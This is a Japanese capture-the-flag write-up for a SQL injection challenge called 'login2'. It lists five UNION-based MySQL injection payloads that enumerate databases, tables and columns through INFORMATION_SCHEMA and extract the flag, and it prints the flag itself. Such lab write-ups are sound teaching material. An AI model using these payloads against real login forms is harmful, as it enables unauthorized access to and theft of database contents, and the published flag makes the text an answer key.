---
title: login2
level: hard
flag: FLAG{U2on_591inJEcTioN2}
writer: iwat
---

# login2

## 問題文
The Road to SQL Master - Part2 -

## 解法

1. UNIONを用いてカラム数を特定する。エラー
が出ない場合にカラム数が特定できたと判断する。<br>
`' UNION SELECT 1;#`<br>

2.DB名を特定する<br>
`' UNION SELECT  GROUP_CONCAT(DISTINCT TABLE_SCHEMA) FROM INFORMATION_SCHEMA.TABLES;#` <br>

3.特定したDB名を用いて、テーブル名を特定する<br>
`' UNION SELECT  GROUP_CONCAT(DISTINCT TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'login2';#` <br>

4.カラム名を特定する<br>
`' UNION SELECT GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 's3cret';# `<br>

5.UNIONを用いてs3cretテーブルからFLAGを取得する<br>
`' UNION SELECT fl4g from s3cret;# `